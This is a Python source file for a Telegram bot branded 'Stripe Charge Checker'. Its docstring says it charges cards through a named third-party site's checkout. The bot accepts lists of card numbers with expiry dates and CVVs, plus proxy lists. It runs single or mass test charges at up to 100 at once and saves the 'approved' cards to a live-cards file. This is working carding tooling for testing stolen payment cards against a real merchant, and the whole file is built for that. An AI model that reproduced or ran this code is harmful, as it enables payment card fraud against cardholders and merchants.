"""
Telegram Bot — Stripe Charge Checker
Charges cards through gospelpianosimple.com/checkout
"""
import os
import sys
import io
import asyncio
import json
import logging
import tempfile
import random
import aiohttp
from aiohttp import web
from datetime import datetime

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

import stripe_checker as checker

# ───────────────────────────── config ───────────────────────────────

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
PORT = int(os.environ.get("PORT", 8080))
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
CREDIT = "Credits By:@Poriot_ke"

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ──────────────────────────── session ──────────────────────────────

sessions: dict = {}


def session(uid: int) -> dict:
    if uid not in sessions:
        sessions[uid] = {
            "cards": [],
            "proxies": [],
            "results": [],
            "running": False,
        }
    return sessions[uid]


def save_approved_card(result: dict):
    """Append approved card to saved file."""
    os.makedirs("approved_cards", exist_ok=True)
    with open("approved_cards/live.txt", "a") as f:
        f.write(f"{result['cc']} | {result.get('response', '')} | {result.get('charge_id', '')}\n")


# ─────────────────────────── helpers ───────────────────────────────

def parse_card_lines(text: str):
    """Parse multiple card lines from text. Returns (valid_lines, skipped_count)."""
    valid = []
    skipped = 0
    for line in text.strip().split("\n"):
        line = line.strip()
        if not line:
            continue
        parts = line.split("|")
        if len(parts) == 4:
            valid.append(line)
        else:
            skipped += 1
    return valid, skipped


def parse_proxy_lines(text: str):
    """Parse proxy lines from text."""
    proxies = []
    for line in text.strip().split("\n"):
        proxy = checker.parse_proxy_line(line)
        if proxy:
            proxies.append(proxy)
    return proxies


# ──────────────────────────── handlers ─────────────────────────────

async def error_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(f"Update {update} caused error {ctx.error}")


# ── /start ──────────────────────────────────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        f"**💳 Stripe Charge Checker**\n\n"
        f"**/sh** `cc|mm|yy|cvv` — Single charge check\n"
        f"**/check** \[N] — Mass charge check\n"
        f"**/bin** `<BIN>` — BIN lookup\n"
        f"**/results** — Show approved charges\n"
        f"**/status** — Session status\n"
        f"**/clear** — Reset session\n\n"
        f"📁 Upload `.txt` files (cards or proxies)\n"
        f"━━━━━━━━━━━━━━━━\n{CREDIT}",
        parse_mode="Markdown",
    )


# ── /sh ─────────────────────────────────────────────────────────────
async def cmd_sh(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await update.message.reply_text(
            "**Usage:** `/sh cc|mm|yy|cvv`\n"
            "Example: `/sh 4242424242424242|12|2026|123`",
            parse_mode="Markdown",
        )
        return

    raw = " ".join(ctx.args).strip()
    parts = raw.replace("|", " ").split()
    if len(parts) != 4:
        parts2 = raw.split("|")
        if len(parts2) == 4:
            parts = parts2
        else:
            await update.message.reply_text(
                "**❌** Invalid format. Use: **cc|mm|yy|cvv**",
                parse_mode="Markdown",
            )
            return

    cc, mes, ano, cvv = parts
    msg = await update.message.reply_text(
        f"**⏳ Charging** `{cc[:6]}******{cc[-4:]}`...",
        parse_mode="Markdown",
    )

    try:
        result = await checker.check_card(cc, mes, ano, cvv)
    except Exception as e:
        await msg.edit_text(f"**❌ Error:** `{e}`", parse_mode="Markdown")
        return

    emoji = "✅" if result.get("is_live") else "❌"
    text = (
        f"{emoji} **{'APPROVED' if result.get('is_live') else 'DECLINED'}**\n\n"
        f"**💳** `{result['cc']}`\n"
        f"**📌** {result.get('response', 'N/A')}"
    )
    charge_id = result.get('charge_id', '')
    if charge_id:
        text += f"\n**🔗** Charge: `{charge_id}`"
    text += f"\n\n━━━━━━━━━━━━━━━━\n{CREDIT}"

    await msg.edit_text(text, parse_mode="Markdown")

    if result.get("is_live"):
        save_approved_card(result)


# ── /check ──────────────────────────────────────────────────────────
async def cmd_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = session(uid)

    if s["running"]:
        await update.message.reply_text(
            "**⏳** Already running! Wait or use **`/clear`**.", parse_mode="Markdown"
        )
        return

    concurrency = 10
    if ctx.args:
        try:
            concurrency = max(1, min(int(ctx.args[0]), 100))
        except ValueError:
            pass

    # Try reply-mode first
    cards_to_check = []
    reply_msg = update.message.reply_to_message
    if reply_msg and reply_msg.text:
        cards_to_check, skipped = parse_card_lines(reply_msg.text)

    # Fallback to session cards
    if not cards_to_check:
        cards_to_check = list(s["cards"])

    if not cards_to_check:
        await update.message.reply_text(
            "**❌** No cards to check.\n"
            "Paste cards → reply **`/check`**.\n"
            "Or load with **`/addcards`** first.",
            parse_mode="Markdown",
        )
        return

    s["running"] = True
    s["results"] = []

    if reply_msg and reply_msg.text:
        s["cards"].extend(cards_to_check)

    msg = await update.message.reply_text(
        f"**⚡ Charging** {len(cards_to_check)} card{'s' if len(cards_to_check) != 1 else ''}...",
        parse_mode="Markdown",
    )

    # Write to temp file
    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tmp:
        tmp_path = tmp.name
        for c in cards_to_check:
            tmp.write(c + "\n")

    approved = []
    live_results = []
    proxies = s["proxies"] if s["proxies"] else []
    total = len(cards_to_check)

    # Progress callback — updates message after each card
    async def on_card_result(result, completed, total):
        nonlocal approved, live_results, msg
        is_live = result.get("is_live", False)
        live_results.append(result)
        if is_live:
            approved.append(result)
        emoji = "✅" if is_live else "❌"
        resp = result.get("response", "")
        cc = result.get("cc", "?")
        lines = [f"**⚡ Live Check** — {completed}/{total}"]
        lines.append(f"**📌 Latest:** {emoji} {cc}")
        lines.append(f"    ↳ {resp}")
        lines.append("")
        lines.append(f"**✅ Approved:** {len(approved)}")
        lines.append(f"**❌ Declined:** {completed - len(approved)}")
        lines.append(f"**⏳ Remaining:** {total - completed}")
        if approved:
            lines.append("")
            lines.append("**💳 Approved charges:**")
            for a in approved[-3:]:
                cid = a.get('charge_id', '')
                lines.append(f"  ✅ `{a['cc']}` — {a.get('response', '')[:40]}")
        try:
            await msg.edit_text("\n".join(lines), parse_mode="Markdown")
        except Exception:
            pass

    try:
        results = await checker.mass_check(
            tmp_path,
            proxies=proxies,
            concurrency=concurrency,
            progress_callback=on_card_result,
        )
        s["results"] = results

        declined = len(results) - len(approved)

        for r in approved:
            save_approved_card(r)

        parts = [f"**✅ Done!**\n"]
        parts.append(f"**📋** Checked: **{len(results)}**")
        parts.append(f"**✅** Approved: **{len(approved)}**")
        parts.append(f"**❌** Declined: **{declined}**")

        if approved:
            parts.append("")
            parts.append("**💳 Approved charges:**")
            top = approved[:5]
            for r in top:
                cid = r.get('charge_id', '')
                parts.append(f"`{r['cc']}` — {r['response'][:50]}")
            if len(approved) > 5:
                parts.append(f"... **+{len(approved) - 5}** more. Use **`/results`** to see all.")
            parts.append("")
            parts.append(f"━━━━━━━━━━━━━━━━\n{CREDIT}")

        await msg.edit_text("\n".join(parts), parse_mode="Markdown")
    except Exception as e:
        await msg.edit_text(f"**❌** Error: `{e}`", parse_mode="Markdown")
        logger.exception("Check failed")
    finally:
        os.unlink(tmp_path)
        s["running"] = False


# ── /results ────────────────────────────────────────────────────────
async def cmd_results(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = session(uid)
    approved = [r for r in s["results"] if r.get("is_live")]

    if not approved:
        await update.message.reply_text(
            "**❌** No approved charges yet. Run **`/check`**.", parse_mode="Markdown"
        )
        return

    lines = []
    for i, r in enumerate(approved, 1):
        cid = r.get('charge_id', '')
        line = f"{i}. `{r['cc']}` — {r['response'][:60]}"
        if cid:
            line += f" | `{cid}`"
        lines.append(line)

    full = "**✅ Approved Charges**\n\n" + "\n".join(lines) + f"\n\n━━━━━━━━━━━━━━━━\n{CREDIT}"

    for i in range(0, len(full), 3900):
        await update.message.reply_text(full[i:i+3900], parse_mode="Markdown")


# ── /status ─────────────────────────────────────────────────────────
async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = session(uid)
    approved = sum(1 for r in s["results"] if r.get("is_live"))
    checked = len(s["results"])

    await update.message.reply_text(
        f"**📊 Session Status**\n\n"
        f"**💳** Cards loaded: **{len(s['cards'])}**\n"
        f"**🌐** Proxies loaded: **{len(s['proxies'])}**\n"
        f"**⚙️** Running: **{'Yes' if s['running'] else 'No'}**\n"
        f"**✅** Approved: **{approved}**\n"
        f"**📋** Checked: **{checked}**\n\n"
        f"━━━━━━━━━━━━━━━━\n{CREDIT}",
        parse_mode="Markdown",
    )


# ── /clear ──────────────────────────────────────────────────────────
async def cmd_clear(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = session(uid)
    s["cards"] = []
    s["proxies"] = []
    s["results"] = []
    s["running"] = False
    await update.message.reply_text(
        "**🗑️** Session cleared.", parse_mode="Markdown"
    )


# ── /help ───────────────────────────────────────────────────────────
async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        f"**💳 Stripe Charge Checker Commands**\n\n"
        f"**/sh** `cc|mm|yy|cvv` — Single charge attempt\n"
        f"**/check** \[N] — Mass check with live progress\n"
        f"**/bin** `<BIN>` — BIN lookup\n"
        f"**/results** — Show approved charges\n"
        f"**/status** — Session status\n"
        f"**/addcards** — Load cards from replied message\n"
        f"**/addproxy** — Load proxies from replied message\n"
        f"**/saved** — Show saved approved cards\n"
        f"**/clear** — Reset session\n\n"
        f"📁 **Upload .txt** — auto-detect cards or proxies\n"
        f"━━━━━━━━━━━━━━━━\n{CREDIT}",
        parse_mode="Markdown",
    )


# ── Saved cards ─────────────────────────────────────────────────────
async def cmd_saved(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        with open("approved_cards/live.txt", "r") as f:
            content = f.read().strip()
        if not content:
            raise FileNotFoundError
        await update.message.reply_text(
            f"**📁 Saved Approved Charges**\n\n```\n{content[-3500:]}\n```",
            parse_mode="Markdown",
        )
    except FileNotFoundError:
        await update.message.reply_text(
            "**❌** No saved charges yet.", parse_mode="Markdown"
        )


# ── /addcards ───────────────────────────────────────────────────────
async def cmd_addcards(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = session(uid)
    reply = update.message.reply_to_message
    if not reply or not reply.text:
        await update.message.reply_text("**❌** Reply to a message with card data.", parse_mode="Markdown")
        return
    cards, skipped = parse_card_lines(reply.text)
    if not cards:
        await update.message.reply_text("**❌** No valid cards found.", parse_mode="Markdown")
        return
    s["cards"].extend(cards)
    text = f"**✅ {len(cards)}** card{'s' if len(cards) != 1 else ''} loaded."
    if skipped:
        text += f"\n**⚠️** Skipped **{skipped}** line(s)."
    await update.message.reply_text(text, parse_mode="Markdown")


# ── /addproxy ───────────────────────────────────────────────────────
async def cmd_addproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = session(uid)
    reply = update.message.reply_to_message
    if not reply or not reply.text:
        await update.message.reply_text("**❌** Reply to a message with proxy data.", parse_mode="Markdown")
        return
    proxies = parse_proxy_lines(reply.text)
    if not proxies:
        await update.message.reply_text("**❌** No valid proxies found.", parse_mode="Markdown")
        return
    s["proxies"].extend(proxies)
    await update.message.reply_text(
        f"**🌐 {len(proxies)}** prox{'ies' if len(proxies) != 1 else 'y'} loaded.\n"
        f"**📊** Total: **{len(s['proxies'])}** proxies.",
        parse_mode="Markdown",
    )


# ── /bin ────────────────────────────────────────────────────────────
async def cmd_bin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Simple BIN lookup using the BIN API."""
    if not ctx.args:
        await update.message.reply_text("**Usage:** `/bin <BIN>`", parse_mode="Markdown")
        return

    bin_num = ctx.args[0].strip()[:6]
    if not bin_num.isdigit():
        await update.message.reply_text("**❌** BIN must be digits.", parse_mode="Markdown")
        return

    msg = await update.message.reply_text(f"**🔍** Looking up BIN `{bin_num}`...", parse_mode="Markdown")

    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://lookup.binlist.net/{bin_num}") as resp:
                if resp.status == 200:
                    data = await resp.json()
                elif resp.status == 429:
                    await msg.edit_text("**⚠️** Rate limited. Try again later.", parse_mode="Markdown")
                    return
                else:
                    await msg.edit_text(f"**❌** BIN lookup failed (HTTP {resp.status})", parse_mode="Markdown")
                    return
    except Exception as e:
        await msg.edit_text(f"**❌** Error: `{e}`", parse_mode="Markdown")
        return

    scheme = data.get("scheme", "N/A") or "N/A"
    brand = data.get("brand", "N/A") or "N/A"
    type_ = data.get("type", "N/A") or "N/A"
    prepaid = "Yes" if data.get("prepaid") else "No"
    country_name = (data.get("country") or {}).get("name", "N/A") or "N/A"
    country_code = (data.get("country") or {}).get("alpha2", "") or ""
    bank_name = (data.get("bank") or {}).get("name", "N/A") or "N/A"
    bank_url = (data.get("bank") or {}).get("url", "") or ""
    bank_phone = (data.get("bank") or {}).get("phone", "") or ""

    country_line = f"Country: {country_name}"
    if country_code:
        country_line += f" ({country_code})"

    lines = [
        f"🏦 BIN Lookup: {bin_num}",
        "",
        f"💳 Scheme: {scheme}",
        f"🏷️ Brand: {brand}",
        f"📂 Type: {type_}",
        f"💵 Prepaid: {prepaid}",
        f"🌍 {country_line}",
        f"🏛️ Bank: {bank_name}",
    ]
    if bank_url:
        lines.append(f"🌐 URL: {bank_url}")
    if bank_phone:
        lines.append(f"📞 Phone: {bank_phone}")
    if not data.get("bank"):
        lines.append("")
        lines.append("⚠️ No bank details available for this BIN.")
    lines.append("")
    lines.append(f"━━━━━━━━━━━━━━━━\n{CREDIT}")

    await msg.edit_text("\n".join(lines))


# ── File upload handler ─────────────────────────────────────────────
async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    s = session(uid)
    doc = update.message.document

    if not doc.file_name or not doc.file_name.endswith(".txt"):
        await update.message.reply_text(
            "**❌** Please upload a **`.txt`** file.", parse_mode="Markdown"
        )
        return

    file = await doc.get_file()
    content = await file.download_as_bytearray()
    text = content.decode("utf-8", errors="ignore")

    # Try cards first
    cards, skipped = parse_card_lines(text)
    if cards:
        s["cards"].extend(cards)
        label = "cards" if len(cards) != 1 else "card"
        parts = [f"**💳 {len(cards)}** {label} loaded from `{doc.file_name}`"]
        if skipped:
            parts.append(f"**⚠️** Skipped **{skipped}** line(s).")
        parts.append(f"**📊** Total: **{len(s['cards'])}** cards.\n**➡️** Reply **`/check`** to run.")
        await update.message.reply_text("\n".join(parts), parse_mode="Markdown")
        return

    # Try proxies
    proxies = parse_proxy_lines(text)
    if proxies:
        s["proxies"].extend(proxies)
        label = "proxies" if len(proxies) != 1 else "proxy"
        await update.message.reply_text(
            f"**🌐 {len(proxies)}** {label} loaded from `{doc.file_name}`\n"
            f"**📊** Total: **{len(s['proxies'])}** proxies.",
            parse_mode="Markdown",
        )
        return

    await update.message.reply_text(
        "**❌** No valid cards or proxies found in file.", parse_mode="Markdown"
    )


# ───────────────────────────── main ────────────────────────────────

def start_health_server():
    """Return a minimal aiohttp app for Railway health checks."""
    app = web.Application()
    async def health(request):
        return web.Response(text="OK")
    app.router.add_get("/", health)
    return app


async def async_main() -> None:
    """Async entrypoint — starts health server first, then bot."""
    bot_app = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()

    bot_app.add_handler(CommandHandler("start", cmd_start))
    bot_app.add_handler(CommandHandler("help", cmd_help))
    bot_app.add_handler(CommandHandler("sh", cmd_sh))
    bot_app.add_handler(CommandHandler("check", cmd_check))
    bot_app.add_handler(CommandHandler("bin", cmd_bin))
    bot_app.add_handler(CommandHandler("addproxy", cmd_addproxy))
    bot_app.add_handler(CommandHandler("addcards", cmd_addcards))
    bot_app.add_handler(CommandHandler("results", cmd_results))
    bot_app.add_handler(CommandHandler("status", cmd_status))
    bot_app.add_handler(CommandHandler("saved", cmd_saved))
    bot_app.add_handler(CommandHandler("clear", cmd_clear))
    bot_app.add_handler(MessageHandler(filters.Document.TEXT, handle_document))
    bot_app.add_error_handler(error_handler)

    # Start health server for Railway
    health_app = start_health_server()
    runner = web.AppRunner(health_app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info(f"✅ Health check server listening on 0.0.0.0:{PORT}")

    # Kill any stale webhook before connecting
    await bot_app.bot.delete_webhook(drop_pending_updates=True)
    logger.info("🧹 Cleared stale webhook / pending updates")
    await asyncio.sleep(0.5)

    await bot_app.initialize()
    await bot_app.start()
    await bot_app.updater.start_polling(drop_pending_updates=True)
    logger.info("✅ Bot polling started")

    # Keep alive
    try:
        await asyncio.Event().wait()
    finally:
        await bot_app.stop()
        await runner.cleanup()


def main() -> None:
    asyncio.run(async_main())


if __name__ == "__main__":
    main()
